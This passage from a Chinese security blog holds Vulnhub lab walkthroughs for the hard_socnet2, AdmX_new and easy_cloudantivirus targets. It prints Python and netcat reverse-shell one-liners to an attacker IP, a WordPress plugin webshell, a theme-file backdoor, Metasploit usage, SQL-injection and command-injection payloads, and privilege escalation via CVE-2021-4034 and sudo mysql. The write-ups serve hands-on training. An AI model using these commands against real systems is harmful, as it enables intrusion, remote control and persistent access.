class="line">1、临时解决方法, 将pkexec中的SUID-bit删除进行临时规避</span><br><span class="line">chmod 0755 /usr/bin/pkexec</span><br><span class="line">2、永久解决方法</span><br><span class="line">centos</span><br><span class="line">rpm -qa polkit</span><br><span class="line">yum -y update polkit</span><br><span class="line">ubuntu</span><br><span class="line">dpkg -l |grep policykit</span><br><span class="line">apt-get -y install policykit-1</span><br><span class="line">3、不受影响版本</span><br><span class="line">    CentOS：</span><br><span class="line">    · CentOS 6：polkit-0.96-11.el6_10.2</span><br><span class="line">    · CentOS 7：polkit-0.112-26.el7_9.1</span><br><span class="line">    · CentOS 8.0：polkit-0.115-13.el8_5.1</span><br><span class="line">    · CentOS 8.2：polkit-0.115-11.el8_2.2</span><br><span class="line">    · CentOS 8.4：polkit-0.115-11.el8_4.2</span><br><span class="line">    Ubuntu：</span><br><span class="line">    · Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1</span><br><span class="line">    · Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1</span><br><span class="line">    · Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6</span><br><span class="line">    · Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2</span><br><span class="line">    · Ubuntu 21.10：policykit-1-0.105-31ubuntu0.1</span><br><span class="line">    Debain：</span><br><span class="line">    · ：policykit-1 0.105-18+deb9u2</span><br><span class="line">    · Debain stretch：policykit-1 0.105-18+deb9u2</span><br><span class="line">    · Debain buster：policykit-1 0.105-25+deb10u1</span><br><span class="line">    · Debain bullseye：policykit-1 0.105-31+deb11u1</span><br><span class="line">    · Debain bookworm,bullseye：policykit-1 0.105-31.1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https://cloud.tencent.com/developer/article/1945253</span><br><span class="line">https://chowdera.com/2022/02/202202080624363009.html</span><br><span class="line">https://xz.aliyun.com/t/10870#toc-7</span><br></pre></td></tr></table></figure><p>利用python3 exp提权</p><p>将exp上传到目标机，赋予执行权限，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">赋予执行权限chmod u+x cve2021-4034.py</span><br><span class="line">执行python3 cve2021-4034.py</span><br><span class="line">交互式shellpython3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418054705270.png" alt="image-20220418054705270"></p><p>利用C exp提权</p><p>将exp上传到目标机，编译，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编译make</span><br><span class="line">执行./cve-2021-4034</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418055841792.png" alt="image-20220418055841792"></p><p><img src="/2022/04/17/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bhard_socnet2/image-20220418055904066.png" alt="image-20220418055904066"></p><p>总结</p><p>端口扫描开放80，8000 —— 访问web80端口得到登录注册界面 —— post型sql注入获取后台Email和密码 —— 进入后台搜索处存在sql注入，make post处存在任意文件上传 —— 上传php一句话getshell —— 分别利用CVE-2021-3493和CVE-2021-4034完成提权</p><hr><p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机之AdmX_new</title>
      <link href="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/"/>
      <url>/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/</url>
      
        <content type="html"><![CDATA[<p>主机发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.31.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414054305795.png" alt="image-20220414054305795"></p><p>端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.31.45</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412053503800.png" alt="image-20220412053503800"></p><p>服务版本扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p80 192.168.31.34</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412053542916.png" alt="image-20220412053542916"></p><p>访问web，Apache2默认页面</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412053703605.png" alt="image-20220412053703605"></p><p>扫目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.45</span><br></pre></td></tr></table></figure><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412053939407.png" alt="image-20220412053939407" style="zoom:80%;"><p>访问wordpress发现部分文件未加载出来</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412055955244.png" alt="image-20220412055955244"></p><p>随便点击发现源地址都会由192.168.31.45跳转到192.168.159.145</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412054352179.png" alt="image-20220412054352179"></p><p>打开BP对网站进行爬取</p><p>当我们访问192.168.31.45时会强制访问到192.168.159.145加载资源，导致wordpress加载部分内容</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412060204209.png" alt="image-20220412060204209"></p><p>删除原始所有记录，将响应头、响应体里面所有192.168.159.145替换为192.168.31.45</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412055358255.png" alt="image-20220412055358255"></p><p>再次访问页面</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412055845828.png" alt="image-20220412055845828"></p><p>访问&#x2F;wordpress&#x2F;wp-login.php,尝试弱口令</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412060414614.png" alt="image-20220412060414614"></p><p>bp爆破</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412060536627.png" alt="image-20220412060536627"></p><p>top1000没跑出来</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412061349475.png" alt="image-20220412061349475" style="zoom: 80%;"><p>换个字典继续跑 SuperWordlist  MidPwds</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412061543283.png" alt="image-20220412061543283" style="zoom:67%;"><p>admin&#x2F;adam14成功登录后台</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412061835645.png" alt="image-20220412061835645"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wordpress后台拿shell方法</span><br><span class="line">1、media上传文件</span><br><span class="line">2、appearance——theme editor——404template</span><br><span class="line">3、插件——上传插件  shell.php 必须包含插件说明  压缩为zip 上传</span><br></pre></td></tr></table></figure><p>media上传文件</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412062112524.png" alt="image-20220412062112524"></p><p>白名单</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412062423462.png" alt="image-20220412062423462"></p><p>修改404template文件，不能更新</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412062801088.png" alt="image-20220412062801088"></p><p>上传插件</p><p>php一句话木马、php命令执行代码（插件描述不能少）</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414065633918.png" alt="image-20220414065633918"></p><p>mz.php压缩为zip</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412063512516.png" alt="image-20220412063512516"></p><p>上传插件</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412063555748.png" alt="image-20220412063555748"></p><p>激活插件</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412064523797.png" alt="image-20220412064523797"></p><p>浏览器测试一句话 插件路径（&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;插件名）</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412064745400.png" alt="image-20220412064745400" style="zoom: 67%;"><p>蚁剑连接</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412064837066.png" alt="image-20220412064837066" style="zoom:67%;"><p>shell为www权限</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412065036244.png" alt="image-20220412065036244"></p><p>利用一句话python3反弹shell</p><p>存在python3</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220416112900536.png" alt="image-20220416112900536" style="zoom:80%;"><p>php一句话命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zz=system(&quot;id&quot;);</span><br><span class="line">zz=system(&#x27;id&#x27;);</span><br><span class="line">以上均能成功执行</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412071645438.png" alt="image-20220412071645438"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当输入命令带有&#x27;或&quot;如：</span><br><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.125&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line">无论使用zz=system(&quot;&quot;);还是zz=system(&#x27;&#x27;);都无法执行，因为system中的&#x27;或者&quot;都会与输入命令中的&#x27;或者&quot;提前闭合，导致命令不可用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解决方法</span><br><span class="line">使用反引号``</span><br><span class="line">zz=system(`python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.125&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;`)</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412071131153.png" alt="image-20220412071131153"></p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412071204054.png" alt="image-20220412071204054"></p><p>python交互式shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413053204707.png" alt="image-20220413053204707"></p><p>命令执行反弹shell</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414065925868.png" alt="image-20220414065925868"></p><p>python3反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.125&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414070211169.png" alt="image-20220414070211169"></p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414070233218.png" alt="image-20220414070233218"></p><p>msf获取shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">进入msf   msfconsole</span><br><span class="line">搜索相关模块search wordpress admin</span><br><span class="line">使用模块 use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class="line">查看参数 show options</span><br><span class="line">配置参数 set PASSWORD adam14</span><br><span class="line">           set rhosts 192.168.31.45</span><br><span class="line">           set targeturi /wordpress</span><br><span class="line">           set username admin</span><br><span class="line">执行  exploit / run</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414071617875.png" alt="image-20220414071617875"></p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414071639092.png" alt="image-20220414071639092"></p><p>升级shell为完全体shell（个人环境和目标环境必须是b shell）</p><p>修改攻击机环境为bsh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">检查    ls /bin/bash</span><br><span class="line">修改    chsh -s /bin/bash</span><br><span class="line">重启    reboot</span><br><span class="line">验证    echo $SHELL</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415064404796.png" alt="image-20220415064404796"></p><p>当前shell（编辑不能移动光标、tab不能自动补全命令）</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415062125002.png" alt="image-20220415062125002"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将会话放到后台ctrl + z</span><br><span class="line">配置    stty raw -echo</span><br><span class="line">将后台会话放到前台fg</span><br></pre></td></tr></table></figure><p>测试自动补全功能</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415065022468.png" alt="image-20220415065022468"></p><p>目标机操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export $SHELL=/bin/bash</span><br><span class="line">export TERM=screen</span><br><span class="line">stty rows 38 columns 116</span><br><span class="line">reset</span><br></pre></td></tr></table></figure><p>添加后门</p><p>查看当前使用模板</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415070918520.png" alt="image-20220415070918520" style="zoom:67%;"><p>在404配置文件中写入一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认路径     wp-content/themes/twentytwentyone/404.php</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415065318122.png" alt="image-20220415065318122"></p><p>蚁剑连接</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415070418694.png" alt="image-20220415070418694" style="zoom:80%;"><p>信息搜集</p><p>查看&#x2F;etc&#x2F;passwd发现可登录账号有root和wpadmin</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413053529613.png" alt="image-20220413053529613" style="zoom: 80%;"><p>wpadmin 家目录下发现local.txt，仅wpadmin有读权限</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413063231060.png" alt="image-20220413063231060"></p><p>www-data  —-&gt;  wpadmin  </p><p>查看内核版本信息，未找到可利用exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413063337022.png" alt="image-20220413063337022"></p><p>查看sudo规则，需要密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413063621357.png" alt="image-20220413063621357"></p><p>查找配置文件</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413054346393.png" alt="image-20220413054346393" style="zoom:80%;"><p>使用admin登录数据库失败</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413054729637.png" alt="image-20220413054729637"></p><p>使用密码切换用户失败</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413064008108.png" alt="image-20220413064008108"></p><p>当前涉及到的账户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">管理后台爆破：adminadam14</span><br><span class="line">wordpress配置文件：adminWp_Admin#123</span><br></pre></td></tr></table></figure><p>使用密码adam14成功切换</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413055655693.png" alt="image-20220413055655693"></p><p>获取flag</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413064119628.png" alt="image-20220413064119628"></p><p>wpadmin    —-&gt;    root</p><p>没有可利用的suid文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413060524349.png" alt="image-20220413060524349"></p><p>sudo -l 发现wpadmin可以以root权限执行&#x2F;usr&#x2F;bin&#x2F;mysql -u root -D wordpress -p</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413062825564.png" alt="image-20220413062825564"></p><p>成功以root权限进入数据库</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413062116450.png" alt="image-20220413062116450"></p><p>数据库内命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system id</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220416113541476.png" alt="image-20220416113541476"></p><p>获取root shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\! /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413062242175.png" alt="image-20220413062242175"></p><p>总结</p><p>端口扫描开放80 —— 目录扫描发现wordpress —— 强制访问资源bp替换地址 —— 爆破进入后台 —— 安装插件getshell（一句话木马python3反弹shell、命令执行python3反弹shell、msf获取shell）—— 完全体交互式shell —— 利用爆破密码www-data切换为wpadmin —— 查看sudo规则以root权限免密进入数据库 —— 数据库内执行命令获取root shell</p><hr><p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机之easy_cloudantivirus</title>
      <link href="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/"/>
      <url>/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机发现</span><br><span class="line">for i in $(seq 1 254); do arping -c 1 192.168.31.$i;done;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161258148.png" alt="image-20220315161258148"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">端口扫描</span><br><span class="line">nmap -p- 192.168.31.14</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161413290.png" alt="image-20220315161413290"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务扫描</span><br><span class="line">nmap -sV -p 22,8080 192.168.31.14</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161555269.png" alt="image-20220315161555269"></p><p>访问web8080</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161645963.png" alt="image-20220315161645963"></p><p>需要输入验证码才能登录，两个思路：bp爆破和post注入</p><p>top1000跑一遍</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162142943.png" alt="image-20220315162142943"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162336861.png" alt="image-20220315162336861"></p><p>暴出密码为password</p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162432644.png" alt="image-20220315162432644" style="zoom:80%;"><p>password登录成功</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163338369.png" alt="image-20220315163338369"></p><p>测试一下sql注入</p><p>双引号报错</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162826715.png" alt="image-20220315162826715"></p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163056812.png" alt="image-20220315163056812" style="zoom:80%;"><p>数据库为sqlite3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关键语句</span><br><span class="line">if len(c.execute(&#x27;select * from code where password=&quot;&#x27; + password + &#x27;&quot;&#x27;).fetchall()) &gt; 0:</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">构造闭合</span><br><span class="line">aaa&quot; or 1=1 --+</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163312634.png" alt="image-20220315163312634"></p><p>成功绕过密码</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163338369.png" alt="image-20220315163338369"></p><p>一个扫病毒的程序，输入文件名，就会对文件进行扫描</p><p>输入bash扫描结果</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163636916.png" alt="image-20220315163636916"></p><p>构造多条命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.;分号，命令都会执行</span><br><span class="line">2.|管道符，前面执行的输出作为后面命令的输入  </span><br><span class="line">3.&amp;&amp;与，前面的命令执行成功，才会去执行后面的命令</span><br><span class="line">4.||或，前面的命令执行失败，才去执行后面的命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash;id</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315164509365.png" alt="image-20220315164509365"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315164534123.png" alt="image-20220315164534123"></p><p>能够执行命令，尝试反弹，目录中有python和netcat，可尝试python反弹、nc反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash|which nc</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165142193.png" alt="image-20220315165142193"></p><p>本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure><p>nc反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash;nc 192.168.31.125 6666 -e /bin/bash</span><br></pre></td></tr></table></figure><p>执行命令后本地监听无反应</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165826025.png" alt="image-20220315165826025"></p><p>nc基本都是禁用-e参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash;nc 192.168.31.125 6666 </span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165730944.png" alt="image-20220315165730944"></p><p>nc串联</p><p>本地监听两个端口，一个用来传输命令，一个用来回显</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315170108855.png" alt="image-20220315170108855"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash | nc 192.168.31.125 12345 | /bin/bash | nc 192.168.31.125 54321</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315170719185.png" alt="image-20220315170719185"></p><p>ls发现存在database.sql文件</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315172531160.png" 